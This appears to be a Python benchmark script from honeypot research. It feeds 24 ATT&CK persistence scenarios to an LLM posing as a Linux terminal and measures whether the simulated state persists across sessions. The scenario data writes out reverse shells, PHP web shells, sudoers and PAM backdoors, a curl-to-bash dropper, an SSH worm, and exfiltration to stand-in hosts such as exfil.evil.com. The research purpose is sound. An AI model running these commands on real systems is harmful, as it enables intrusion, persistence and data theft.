#!/usr/bin/env python3
"""
Appendix Table Benchmark: 24 persistence scenarios x 3 systems x N=3

Fills the per-scenario fidelity table (tab:per-scenario) with real data.
Systems tested:
  1. shelLM   - full history accumulation (Session A messages carry to Session B)
  2. Beelzebub - stateless (Session B has NO context from Session A)
  3. PromptShield - MCP state injection

All systems use the SAME base system prompt and the SAME LLM (DeepSeek).
Only the state management mechanism differs.
"""

import asyncio
import json
import os
import sys
import time
import shutil
import re
from datetime import datetime
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from dotenv import dotenv_values
import openai

# ==================== Config ====================
_env = dotenv_values(os.path.join(os.path.dirname(__file__), '..', '.env'))
_secrets = dotenv_values(os.path.join(os.path.dirname(__file__), '..', '.env.secrets'))
def _cfg(k, d=""):
    return os.environ.get(k) or _secrets.get(k) or _env.get(k, d)

DEEPSEEK_API_KEY = _cfg("DEEPSEEK_API_KEY")
ai_client = openai.AsyncOpenAI(api_key=DEEPSEEK_API_KEY, base_url="https://api.deepseek.com")
AI_MODEL = "deepseek-chat"

N_REPS = 3
TAU_SECONDS = 30  # SFS latency threshold

# Noise commands for Noise-100 condition
NOISE_COMMANDS = [
    "ls", "ls -la", "pwd", "whoami", "id", "uname -a", "hostname",
    "uptime", "df -h", "free -m", "ps aux", "netstat -tlnp", "w",
    "cat /etc/hostname", "date", "cal", "echo hello", "ls /tmp",
    "cat /etc/os-release", "ls /var/log", "ip addr", "route -n",
    "ls /etc", "cat /proc/cpuinfo | head -5", "env | head -5",
    "ls /usr/bin | head", "file /bin/ls", "wc -l /etc/passwd",
    "head -3 /etc/passwd", "tail -3 /etc/passwd", "ls -la /root",
    "echo test", "ls /opt", "ls /dev/shm", "cat /etc/resolv.conf",
    "mount | head -5", "lsblk", "last -5", "history | tail -5",
    "alias", "type ls", "which python3", "which bash", "echo $SHELL",
    "echo $PATH", "echo $HOME", "ls /var", "ls /srv", "ls /usr/local",
    "cat /etc/group | head", "getent passwd root",
]

# Common system prompt used by ALL systems (isolates state-management as the variable)
SYSTEM_PROMPT = (
    "You are Linux OS terminal. You act and respond exactly as a Linux terminal would.\n"
    "You will respond to all commands just as a Linux terminal would.\n"
    "You only reply with the CLI output, and nothing else.\n"
    "Do not explain your output. Do not repeat commands user inputs.\n"
    "Your every output MUST end with a prompt like user@host:path$\n"
    "Current user: root (uid=0, full privileges). Hostname: prod-server-01.\n"
    "This is a production server in an IT company."
)

# ==================== 24 Persistence Scenarios ====================

SCENARIOS = [
    # --- Core HoneyComb (1-5): from ATK replay scenarios ---
    {
        "row": 1, "label": "T1098.004 SSH Keys",
        "session_a": [
            "mkdir -p /root/.ssh",
            "chmod 700 /root/.ssh",
            'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server" >> /root/.ssh/authorized_keys',
            "chmod 600 /root/.ssh/authorized_keys",
            "cat /root/.ssh/authorized_keys",
        ],
        "session_b": ["cat /root/.ssh/authorized_keys"],
        "keywords": ["attacker@c2server", "ssh-rsa"],
    },
    {
        "row": 2, "label": "T1136.001 Local Acct",
        "session_a": [
            "useradd -m -s /bin/bash -G sudo sysadm1n",
            "echo 'sysadm1n:Str0ngP@ss!' | chpasswd",
            'echo "sysadm1n ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
            "id sysadm1n",
        ],
        "session_b": [
            "id sysadm1n",
            "grep sysadm1n /etc/passwd",
            "grep sysadm1n /etc/sudoers",
        ],
        "keywords": ["sysadm1n", "sudo"],
    },
    {
        "row": 3, "label": "T1053.003 Cron",
        "session_a": [
            '(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\'") | crontab -',
            "crontab -l",
        ],
        "session_b": ["crontab -l"],
        "keywords": ["10.0.0.1", "4444"],
    },
    {
        "row": 4, "label": "T1543.002 Systemd",
        "session_a": [
            "cat > /etc/systemd/system/system-health.service << 'EOF'\n"
            "[Unit]\nDescription=System Health Monitor\nAfter=network.target\n\n"
            "[Service]\nExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sleep 3600; done'\n"
            "Restart=always\nRestartSec=60\n\n"
            "[Install]\nWantedBy=multi-user.target\nEOF",
            "systemctl daemon-reload",
            "systemctl enable system-health.service",
        ],
        "session_b": [
            "systemctl is-enabled system-health.service",
            "cat /etc/systemd/system/system-health.service",
        ],
        "keywords": ["enabled", "10.0.0.1"],
    },
    {
        "row": 5, "label": "T1546.004 Shell Cfg",
        "session_a": [
            'echo \'export PROMPT_COMMAND="(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1 &) 2>/dev/null"\' >> /root/.bashrc',
            "cat /root/.bashrc",
        ],
        "session_b": ["cat /root/.bashrc | grep PROMPT_COMMAND"],
        "keywords": ["PROMPT_COMMAND", "10.0.0.1", "9999"],
    },
    # --- Core HoneyComb (6-10): from HoneyComb_Benchmark.csv ---
    {
        "row": 6, "label": "T1037.004 RC Scripts",
        "session_a": [
            "echo '#!/bin/bash' > /etc/rc.local",
            "echo 'nohup /usr/bin/python3 -c \"import socket,subprocess;s=socket.socket();s.connect((\\\"192.168.1.100\\\",4444));subprocess.call([\\\"bash\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\" &' >> /etc/rc.local",
            "chmod +x /etc/rc.local",
        ],
        "session_b": ["cat /etc/rc.local"],
        "keywords": ["192.168.1.100", "4444"],
    },
    {
        "row": 7, "label": "T1078.003 Valid Acct",
        "session_a": [
            "usermod -s /bin/bash nobody",
            "usermod -aG sudo nobody",
            "echo 'nobody ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/nobody",
        ],
        "session_b": ["grep nobody /etc/passwd", "sudo -l -U nobody"],
        "keywords": ["nobody", "/bin/bash", "NOPASSWD"],
    },
    {
        "row": 8, "label": "T1505.003 Web Shell",
        "session_a": [
            "mkdir -p /var/www/html",
            "echo '<?php if(isset($_REQUEST[\"c\"])){$c=$_REQUEST[\"c\"];@system($c.\" 2>&1\");} ?>' > /var/www/html/.system.php",
        ],
        "session_b": ["cat /var/www/html/.system.php"],
        "keywords": ["_REQUEST", "system"],
    },
    {
        "row": 9, "label": "T1574.006 Linker Hijack",
        "session_a": [
            "echo '/usr/local/lib/libsystem.so' >> /etc/ld.so.preload",
            "mkdir -p /usr/local/lib",
            "touch /usr/local/lib/libsystem.so",
        ],
        "session_b": ["cat /etc/ld.so.preload", "ls -la /usr/local/lib/libsystem.so"],
        "keywords": ["libsystem.so"],
    },
    {
        "row": 10, "label": "T1556.003 PAM Backdoor",
        "session_a": [
            "echo 'auth sufficient pam_permit.so' > /tmp/pam_backdoor",
            "cat /etc/pam.d/sshd >> /tmp/pam_backdoor",
            "cat /tmp/pam_backdoor > /etc/pam.d/sshd",
        ],
        "session_b": ["head -1 /etc/pam.d/sshd"],
        "keywords": ["pam_permit.so"],
    },
    # --- Extended (11-24): from attack_replay_extended.py ---
    {
        "row": 11, "label": "T1059.004 Gafgyt Dropper",
        "session_a": [
            'echo "#!/bin/bash" > /var/tmp/.cache_update',
            'echo "nohup bash -c \'while true; do curl -s http://drop.malware.net/gafgyt | bash; sleep 600; done\' &" >> /var/tmp/.cache_update',
            "chmod +x /var/tmp/.cache_update",
        ],
        "session_b": ["cat /var/tmp/.cache_update"],
        "keywords": ["drop.malware.net", "gafgyt"],
    },
    {
        "row": 12, "label": "T1071.001 IRC Botnet",
        "session_a": [
            "mkdir -p /dev/shm/.x",
            'echo "#!/usr/bin/perl" > /dev/shm/.x/bot.pl',
            'echo "# IRC Bot Config" >> /dev/shm/.x/bot.pl',
            'echo "my \\$server = \\"irc.undernet.org\\";" >> /dev/shm/.x/bot.pl',
            'echo "my \\$channel = \\"#botnet-cmd\\";" >> /dev/shm/.x/bot.pl',
            'echo "my \\$nick = \\"bot_\\".int(rand(9999));" >> /dev/shm/.x/bot.pl',
        ],
        "session_b": ["cat /dev/shm/.x/bot.pl"],
        "keywords": ["irc.undernet.org", "#botnet-cmd"],
    },
    {
        "row": 13, "label": "T1499 DDoS Tool",
        "session_a": [
            'echo "#!/bin/bash" > /opt/.ddos',
            'echo "# UDP Flood Tool" >> /opt/.ddos',
            'echo "TARGET=\\$1; PORT=\\$2; DURATION=\\$3" >> /opt/.ddos',
            'echo "timeout \\$DURATION bash -c \\"while true; do echo x > /dev/udp/\\$TARGET/\\$PORT; done\\"" >> /opt/.ddos',
            "chmod +x /opt/.ddos",
        ],
        "session_b": ["cat /opt/.ddos"],
        "keywords": ["UDP Flood", "/dev/udp"],
    },
    {
        "row": 14, "label": "T1021.004 SSH Worm",
        "session_a": [
            'echo "#!/bin/bash" > /tmp/.spread.sh',
            'echo "for ip in \\$(seq 1 254); do" >> /tmp/.spread.sh',
            'echo "  sshpass -p \\"admin123\\" ssh -o StrictHostKeyChecking=no root@192.168.1.\\$ip \\"wget http://c2.worm.net/payload -O /tmp/.worm && chmod +x /tmp/.worm && /tmp/.worm\\" &" >> /tmp/.spread.sh',
            'echo "done" >> /tmp/.spread.sh',
            "chmod +x /tmp/.spread.sh",
        ],
        "session_b": ["cat /tmp/.spread.sh"],
        "keywords": ["192.168.1.", "c2.worm.net"],
    },
    {
        "row": 15, "label": "T1574.006 LD_PRELOAD Var.",
        "session_a": [
            "touch /usr/local/lib/libsystem_helper.so",
            'echo "/usr/local/lib/libsystem_helper.so" >> /etc/ld.so.preload',
        ],
        "session_b": ["cat /etc/ld.so.preload", "ls -la /usr/local/lib/libsystem_helper.so"],
        "keywords": ["libsystem_helper.so"],
    },
    {
        "row": 16, "label": "T1037.004 RC Local Var.",
        "session_a": [
            'echo "#!/bin/bash" > /etc/rc.local',
            'echo "nohup /usr/bin/python3 -c \\"import socket,subprocess;s=socket.socket();s.connect((\'10.0.0.1\',4444));subprocess.call([\'bash\',\'-i\'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\\" &" >> /etc/rc.local',
            "chmod +x /etc/rc.local",
        ],
        "session_b": ["cat /etc/rc.local"],
        "keywords": ["10.0.0.1", "4444", "socket"],
    },
    {
        "row": 17, "label": "T1505.003 Web Shell Var.",
        "session_a": [
            "mkdir -p /var/www/html",
            "echo '<?php if(isset($_REQUEST[\"c\"])){system($_REQUEST[\"c\"]);} ?>' > /var/www/html/.error_handler.php",
        ],
        "session_b": ["cat /var/www/html/.error_handler.php"],
        "keywords": ["_REQUEST", "system"],
    },
    {
        "row": 18, "label": "T1548.001 SUID Backdoor",
        "session_a": [
            "cp /bin/bash /tmp/.rootshell",
            "chmod u+s /tmp/.rootshell",
            "ls -la /tmp/.rootshell",
        ],
        "session_b": ["ls -la /tmp/.rootshell"],
        "keywords": [".rootshell"],
    },
    {
        "row": 19, "label": "T1552.004 SSH Key Theft",
        "session_a": [
            "find /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
            "find /root -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
            "cat /etc/ssh/ssh_host_rsa_key 2>/dev/null",
            'echo "# Stolen keys logged" > /tmp/.keys_collected',
        ],
        "session_b": ["cat /tmp/.keys_collected"],
        "keywords": ["Stolen keys"],
    },
    {
        "row": 20, "label": "T1552.001 Env Var Exfil",
        "session_a": [
            "env",
            'echo "AWS_ACCESS_KEY=EXFILTRATED" > /tmp/.cloud_creds',
        ],
        "session_b": ["cat /tmp/.cloud_creds"],
        "keywords": ["EXFILTRATED"],
    },
    {
        "row": 21, "label": "T1560 Data Archive",
        "session_a": [
            'echo "CONFIDENTIAL DATA: user_database_dump" > /tmp/.exfil_data',
            'echo "tar czf - /etc/passwd /etc/shadow | base64 | curl -X POST -d @- http://exfil.evil.com/collect" > /tmp/.exfil_script.sh',
            "chmod +x /tmp/.exfil_script.sh",
        ],
        "session_b": ["cat /tmp/.exfil_script.sh", "cat /tmp/.exfil_data"],
        "keywords": ["exfil.evil.com", "CONFIDENTIAL"],
    },
    {
        "row": 22, "label": "T1071.004 DNS Tunneling",
        "session_a": [
            'echo "#!/bin/bash" > /tmp/.dns_tunnel',
            'echo "# DNS exfiltration via subdomain encoding" >> /tmp/.dns_tunnel',
            'echo "DATA=\\$(cat /etc/passwd | base64 | tr -d \'\\n\')" >> /tmp/.dns_tunnel',
            'echo "for chunk in \\$(echo \\$DATA | fold -w 60); do nslookup \\$chunk.data.evil-dns.com; done" >> /tmp/.dns_tunnel',
            "chmod +x /tmp/.dns_tunnel",
        ],
        "session_b": ["cat /tmp/.dns_tunnel"],
        "keywords": ["evil-dns.com", "base64"],
    },
    {
        "row": 23, "label": "T1564.001 Process Hiding",
        "session_a": [
            "mkdir -p /dev/shm/.../.hidden",
            'echo "#!/bin/bash" > /dev/shm/.../.hidden/rootkit.sh',
            'echo "# Hide from ps by renaming process" >> /dev/shm/.../.hidden/rootkit.sh',
            "echo \"exec -a '[kworker/0:1]' /bin/bash -c 'while true; do curl -s http://c2.rootkit.net/beacon; sleep 3600; done'\" >> /dev/shm/.../.hidden/rootkit.sh",
            "chmod +x /dev/shm/.../.hidden/rootkit.sh",
        ],
        "session_b": ["cat /dev/shm/.../.hidden/rootkit.sh"],
        "keywords": ["kworker", "c2.rootkit.net"],
    },
    {
        "row": 24, "label": "T1059 Reverse Shell",
        "session_a": [
            "echo 'python3 -c \"import os,socket,subprocess;s=socket.socket();s.connect((chr(49)+chr(48)+chr(46)+chr(48)+chr(46)+chr(48)+chr(46)+chr(49),5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([chr(98)+chr(97)+chr(115)+chr(104),chr(45)+chr(105)])\"' > /tmp/.py_shell",
            "echo 'perl -MSocket -e \"\\$p=5556;socket(S,2,1,0);connect(S,pack_sockaddr_in(\\$p,inet_aton(chr(49).chr(48).chr(46).chr(48).chr(46).chr(48).chr(46).chr(49))));open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");exec(chr(98).chr(97).chr(115).chr(104))\"' > /tmp/.pl_shell",
        ],
        "session_b": ["cat /tmp/.py_shell", "cat /tmp/.pl_shell"],
        "keywords": ["10.0.0.1", "5555"],
    },
]


# ==================== LLM Call ====================

async def call_llm(messages, retries=3):
    """Call DeepSeek API with retry logic."""
    for attempt in range(retries):
        try:
            start = time.time()
            resp = await ai_client.chat.completions.create(
                model=AI_MODEL,
                messages=messages,
                temperature=0.0,
                max_tokens=800,
            )
            latency = (time.time() - start) * 1000
            text = resp.choices[0].message.content or ""
            tokens = resp.usage.total_tokens if resp.usage else 0
            return text, tokens, latency
        except Exception as e:
            if attempt < retries - 1:
                await asyncio.sleep(2 ** (attempt + 1))
            else:
                raise
    return "", 0, 0


# ==================== Noise Injection ====================

import random

def generate_noise_commands(n=100):
    """Generate n noise commands by cycling through NOISE_COMMANDS with shuffle."""
    cmds = []
    pool = list(NOISE_COMMANDS)
    while len(cmds) < n:
        random.shuffle(pool)
        cmds.extend(pool)
    return cmds[:n]


async def inject_noise(messages, n_noise=100):
    """
    Inject noise commands into a conversation (history-accumulating mode).
    Each noise command is sent as user message, LLM response appended.
    Returns updated messages list and total noise tokens/latency.
    """
    noise_cmds = generate_noise_commands(n_noise)
    noise_tokens = 0
    noise_latency = 0.0
    for cmd in noise_cmds:
        messages.append({"role": "user", "content": cmd})
        text, tok, lat = await call_llm(messages)
        messages.append({"role": "assistant", "content": text or "[no output]"})
        noise_tokens += tok
        noise_latency += lat
        # Minimal delay to avoid rate limits
        await asyncio.sleep(0.3)
    return messages, noise_tokens, noise_latency


# ==================== System Implementations ====================

async def run_shellm(scenario, noise_level=0):
    """
    shelLM-style: full history accumulation.
    Session B receives the ENTIRE Session A conversation as prior context.
    If noise_level > 0, inject that many noise commands between sessions.
    """
    # Session A
    messages_a = [{"role": "system", "content": SYSTEM_PROMPT}]
    a_responses = []
    total_tokens = 0
    total_latency = 0.0

    for cmd in scenario["session_a"]:
        messages_a.append({"role": "user", "content": cmd})
        text, tok, lat = await call_llm(messages_a)
        messages_a.append({"role": "assistant", "content": text or "[no output]"})
        a_responses.append({"cmd": cmd[:120], "response": text[:500], "tokens": tok, "latency_ms": lat})
        total_tokens += tok
        total_latency += lat
        await asyncio.sleep(0.5)

    # Session B: carry full history (shelLM behavior)
    # Insert session separator (shelLM adds "Here the session stopped..." in history.txt)
    messages_b = list(messages_a)

    # Inject noise if requested (between Session A and Session B)
    if noise_level > 0:
        messages_b, noise_tok, noise_lat = await inject_noise(messages_b, noise_level)
        total_tokens += noise_tok
        total_latency += noise_lat

    messages_b.append({
        "role": "system",
        "content": "Here the session stopped and there might be a continuation or not"
    })

    b_responses = []
    for cmd in scenario["session_b"]:
        messages_b.append({"role": "user", "content": cmd})
        text, tok, lat = await call_llm(messages_b)
        messages_b.append({"role": "assistant", "content": text or "[no output]"})
        b_responses.append({"cmd": cmd[:120], "response": text[:500], "tokens": tok, "latency_ms": lat})
        total_tokens += tok
        total_latency += lat
        await asyncio.sleep(0.5)

    return a_responses, b_responses, total_tokens, total_latency


async def run_beelzebub(scenario, noise_level=0):
    """
    Beelzebub-style: completely stateless.
    Session B starts from scratch with NO context from Session A.
    Noise has no effect since Session B is already independent.
    """
    # Session A
    messages_a = [{"role": "system", "content": SYSTEM_PROMPT}]
    a_responses = []
    total_tokens = 0
    total_latency = 0.0

    for cmd in scenario["session_a"]:
        messages_a.append({"role": "user", "content": cmd})
        text, tok, lat = await call_llm(messages_a)
        messages_a.append({"role": "assistant", "content": text or "[no output]"})
        a_responses.append({"cmd": cmd[:120], "response": text[:500], "tokens": tok, "latency_ms": lat})
        total_tokens += tok
        total_latency += lat
        await asyncio.sleep(0.5)

    # Session B: completely fresh context (stateless - Beelzebub behavior)
    messages_b = [{"role": "system", "content": SYSTEM_PROMPT}]
    b_responses = []
    for cmd in scenario["session_b"]:
        messages_b.append({"role": "user", "content": cmd})
        text, tok, lat = await call_llm(messages_b)
        messages_b.append({"role": "assistant", "content": text or "[no output]"})
        b_responses.append({"cmd": cmd[:120], "response": text[:500], "tokens": tok, "latency_ms": lat})
        total_tokens += tok
        total_latency += lat
        await asyncio.sleep(0.5)

    return a_responses, b_responses, total_tokens, total_latency


async def run_promptshield(scenario, noise_level=0):
    """
    PromptShield: MCP state injection.
    Session A events are recorded to MCP state store.
    Session B automatically gets state-injected context via build_enhanced_messages.
    If noise_level > 0, inject noise commands between sessions (noise is NOT recorded to MCP).
    """
    from mcp_client import HoneypotMCPClient
    from LinuxSSHbot_mcp import build_enhanced_messages
    from mcp_state_manager.command_analyzer import CommandAnalyzer

    storage_base = "./appendix_benchmark_memory"
    sid = "S%02d" % scenario["row"]
    # Use unique storage per rep to avoid state collision
    storage_path = os.path.join(storage_base, sid)
    if os.path.exists(storage_path):
        shutil.rmtree(storage_path)
    os.makedirs(os.path.join(storage_path, "states"), exist_ok=True)
    os.makedirs(os.path.join(storage_path, "graphs"), exist_ok=True)

    analyzer = CommandAnalyzer()
    ip = "attacker_%s" % sid

    # Session A: attack commands with MCP recording
    client_a = HoneypotMCPClient(storage_path=storage_path, global_singleton_mode=True)
    await client_a.connect()

    messages = [{"role": "system", "content": SYSTEM_PROMPT}]
    cwd = "/root"
    a_responses = []
    total_tokens = 0
    total_latency = 0.0

    for cmd in scenario["session_a"]:
        ts_cmd = " %s\t<%s>\n" % (cmd, datetime.now())
        messages.append({"role": "user", "content": ts_cmd})
        filtered = [m for m in messages
                    if not (m["role"] == "assistant" and not m.get("content", "").strip())]
        enhanced = await build_enhanced_messages(filtered, cmd, cwd, client=client_a, ip_address=ip)
        text, tok, lat = await call_llm(enhanced)
        messages.append({"role": "assistant", "content": text or "[no output]"})
        a_responses.append({"cmd": cmd[:120], "response": text[:500], "tokens": tok, "latency_ms": lat})
        total_tokens += tok
        total_latency += lat

        # Record MCP event
        et = analyzer.determine_event_type(cmd)
        st = analyzer.determine_status(cmd, text)
        sc = analyzer.analyze_state_changes(cmd, text, cwd=cwd)
        await client_a.record_event(
            ip_address=ip,
            session_id="session_a_%s" % sid,
            command=cmd,
            user_context="root",
            event_type=et.value if hasattr(et, "value") else str(et),
            status=st.value if hasattr(st, "value") else str(st),
            stdout=text,
            state_changes=[
                {"target": s.target, "change_type": s.change_type,
                 "old_value": s.old_value, "new_value": s.new_value,
                 "metadata": s.metadata}
                for s in sc
            ] if sc else [],
        )
        await asyncio.sleep(0.5)

    await client_a.close()

    # Session B: verification with state injection
    await asyncio.sleep(0.3)
    client_b = HoneypotMCPClient(storage_path=storage_path, global_singleton_mode=True)
    await client_b.connect()

    messages_b = [{"role": "system", "content": SYSTEM_PROMPT}]

    # Inject noise into Session B conversation if requested
    # Noise commands go through LLM but are NOT recorded to MCP state
    if noise_level > 0:
        noise_cmds = generate_noise_commands(noise_level)
        for ncmd in noise_cmds:
            ts_ncmd = " %s\t<%s>\n" % (ncmd, datetime.now())
            messages_b.append({"role": "user", "content": ts_ncmd})
            n_filtered = [m for m in messages_b
                          if not (m["role"] == "assistant" and not m.get("content", "").strip())]
            n_enhanced = await build_enhanced_messages(
                n_filtered, ncmd, "/root", client=client_b, ip_address=ip
            )
            ntext, ntok, nlat = await call_llm(n_enhanced)
            messages_b.append({"role": "assistant", "content": ntext or "[no output]"})
            total_tokens += ntok
            total_latency += nlat
            await asyncio.sleep(0.3)

    b_responses = []
    for cmd in scenario["session_b"]:
        ts_cmd = " %s\t<%s>\n" % (cmd, datetime.now())
        messages_b.append({"role": "user", "content": ts_cmd})
        filtered_b = [m for m in messages_b
                      if not (m["role"] == "assistant" and not m.get("content", "").strip())]
        enhanced_b = await build_enhanced_messages(
            filtered_b, cmd, "/root", client=client_b, ip_address=ip
        )
        text, tok, lat = await call_llm(enhanced_b)
        messages_b.append({"role": "assistant", "content": text or "[no output]"})
        b_responses.append({"cmd": cmd[:120], "response": text[:500], "tokens": tok, "latency_ms": lat})
        total_tokens += tok
        total_latency += lat
        await asyncio.sleep(0.5)

    await client_b.close()

    return a_responses, b_responses, total_tokens, total_latency


# ==================== Metric Computation ====================

def compute_kr(b_responses, keywords):
    """Keyword Recall: |K_found| / |K_total|"""
    if not keywords:
        return 1.0
    all_b_text = " ".join(r["response"] for r in b_responses).lower()
    found = sum(1 for kw in keywords if kw.lower() in all_b_text)
    return found / len(keywords)


def compute_sfs(kr, total_latency_ms):
    """Speed-Fidelity Score: KR * min(1, tau/L)"""
    latency_sec = total_latency_ms / 1000.0
    if latency_sec <= 0:
        return kr
    return kr * min(1.0, TAU_SECONDS / latency_sec)


# ==================== Main Runner ====================

SYSTEMS = {
    "shelLM": run_shellm,
    "Beelzebub": run_beelzebub,
    "PromptShield": run_promptshield,
}


async def run_system(sys_name, sys_fn, scenarios, n_reps, noise_level=0):
    """Run all scenarios for one system."""
    noise_tag = " [Noise-%d]" % noise_level if noise_level > 0 else ""
    print("\n" + "#" * 60)
    print("  System: %s%s | Scenarios: %d | Reps: %d" % (sys_name, noise_tag, len(scenarios), n_reps))
    print("#" * 60)

    sys_results = []
    for sc in scenarios:
        row_results = []
        for rep in range(n_reps):
            label = "  [%s%s] Row %2d (%s) rep %d/%d..." % (
                sys_name, noise_tag, sc["row"], sc["label"], rep + 1, n_reps
            )
            print(label, end=" ", flush=True)
            try:
                a_resp, b_resp, tok, lat = await sys_fn(sc, noise_level=noise_level)
                kr = compute_kr(b_resp, sc["keywords"])
                sfs = compute_sfs(kr, lat)
                row_results.append({
                    "rep": rep + 1,
                    "kr": round(kr, 4),
                    "sfs": round(sfs, 4),
                    "tokens": tok,
                    "latency_ms": round(lat, 1),
                    "session_b_responses": b_resp,
                })
                print("KR=%.2f SFS=%.2f (%dtok, %.0fms)" % (kr, sfs, tok, lat))
            except Exception as e:
                print("ERROR: %s" % str(e)[:100])
                row_results.append({
                    "rep": rep + 1,
                    "kr": 0.0,
                    "sfs": 0.0,
                    "error": str(e)[:200],
                })

        avg_kr = sum(r["kr"] for r in row_results) / max(len(row_results), 1)
        avg_sfs = sum(r["sfs"] for r in row_results) / max(len(row_results), 1)
        sys_results.append({
            "row": sc["row"],
            "label": sc["label"],
            "avg_kr": round(avg_kr, 4),
            "avg_sfs": round(avg_sfs, 4),
            "reps": row_results,
        })
        print("  --> Row %d Avg KR=%.2f, Avg SFS=%.2f" % (sc["row"], avg_kr, avg_sfs))

    return sys_results


async def main():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Parse CLI args: [system_name...] [--noise N] [--reps N]
    args = sys.argv[1:]
    noise_level = 0
    n_reps = N_REPS
    if "--noise" in args:
        idx = args.index("--noise")
        noise_level = int(args[idx + 1])
        args = args[:idx] + args[idx + 2:]
    if "--reps" in args:
        idx = args.index("--reps")
        n_reps = int(args[idx + 1])
        args = args[:idx] + args[idx + 2:]

    noise_tag = "_noise%d" % noise_level if noise_level > 0 else ""

    print("=" * 60)
    print("  Appendix Table Benchmark%s" % (" (Noise-%d)" % noise_level if noise_level else ""))
    print("  Scenarios: %d | Systems: %d | Reps/scenario: %d" % (
        len(SCENARIOS), len(SYSTEMS), n_reps
    ))
    print("  Model: %s | tau: %ds | Noise: %d" % (AI_MODEL, TAU_SECONDS, noise_level))
    print("  Start: %s" % timestamp)
    print("=" * 60)

    # Check which systems to run
    systems_to_run = list(SYSTEMS.keys())
    if args:
        systems_to_run = [s for s in args if s in SYSTEMS]
        if not systems_to_run:
            print("Usage: python appendix_benchmark.py [shelLM] [Beelzebub] [PromptShield] [--noise N] [--reps N]")
            print("  Run all if no arguments. Or specify one or more system names.")
            print("  --noise N: inject N noise commands between sessions (default: 0)")
            print("  --reps N:  repetitions per scenario (default: 3)")
            return

    results = {}
    for sys_name in systems_to_run:
        sys_fn = SYSTEMS[sys_name]
        results[sys_name] = await run_system(sys_name, sys_fn, SCENARIOS, n_reps, noise_level)

    # Save JSON report
    report_path = "appendix_benchmark_report%s_%s.json" % (noise_tag, timestamp)
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(
            {
                "meta": {
                    "timestamp": timestamp,
                    "n_reps": n_reps,
                    "model": AI_MODEL,
                    "tau_seconds": TAU_SECONDS,
                    "noise_level": noise_level,
                    "scenarios": len(SCENARIOS),
                    "systems": systems_to_run,
                },
                "results": results,
            },
            f,
            indent=2,
            ensure_ascii=False,
        )
    print("\nReport saved: %s" % report_path)

    # Print summary table
    print("\n" + "=" * 80)
    print("  SUMMARY: Per-Scenario Average KR / SFS")
    print("=" * 80)
    header = "%-30s" % "Scenario"
    for sn in systems_to_run:
        header += " | %s KR  %s SFS" % (sn[:6], sn[:6])
    print(header)
    print("-" * 80)

    for i, sc in enumerate(SCENARIOS):
        line = "%-30s" % sc["label"]
        for sn in systems_to_run:
            if sn in results:
                r = results[sn][i]
                line += " |  %.2f     %.2f   " % (r["avg_kr"], r["avg_sfs"])
            else:
                line += " |  ---      ---    "
        print(line)

    # Print LaTeX-ready data
    if len(results) == 3:
        print("\n--- LaTeX Table Rows ---")
        for i, sc in enumerate(SCENARIOS):
            sl = results.get("shelLM", [{}] * 24)[i]
            bz = results.get("Beelzebub", [{}] * 24)[i]
            ps = results.get("PromptShield", [{}] * 24)[i]
            print(
                "%s & %.2f & %.2f & %.2f & %.2f & %.2f \\\\"
                % (
                    sc["label"],
                    sl.get("avg_kr", 0),
                    sl.get("avg_sfs", 0),
                    bz.get("avg_kr", 0),
                    ps.get("avg_kr", 0),
                    ps.get("avg_sfs", 0),
                )
            )


if __name__ == "__main__":
    asyncio.run(main())
